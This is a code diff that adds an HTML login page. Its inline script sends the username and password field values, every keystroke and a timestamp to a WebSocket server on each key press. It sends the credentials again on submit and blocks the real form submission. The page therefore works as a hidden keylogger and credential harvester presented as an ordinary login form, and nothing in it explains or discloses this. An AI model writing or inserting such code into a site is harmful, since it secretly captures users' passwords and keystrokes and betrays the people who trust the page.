@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="login-container">
+    <h2>Login</h2>
+    <form id="loginForm" action="/login" method="post">
+      <div class="input-group">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+      </div>
+      <div class="input-group">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      <div class="input-group">
+        <button type="submit">Login</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const loginForm = document.getElementById('loginForm');
+    const ws = new WebSocket('ws://localhost:3000');
+
+    document.addEventListener('keydown', (event) => {
+      // Send pressed key along with username, password, and time details
+      const data = {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value,
+        keysPressed: event.key,
+        time: new Date().toLocaleString()
+      };
+      ws.send(JSON.stringify(data));
+    });
+
+    loginForm.addEventListener('submit', (event) => {
+      // Send username and password to server over WebSocket
+      const data = {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value,
+        keysPressed: '',
+        time: new Date().toLocaleString()
+      };
+      ws.send(JSON.stringify(data));
+
+      event.preventDefault(); // Prevent form submission
+    });
+  </script>
+</body>
+</html>
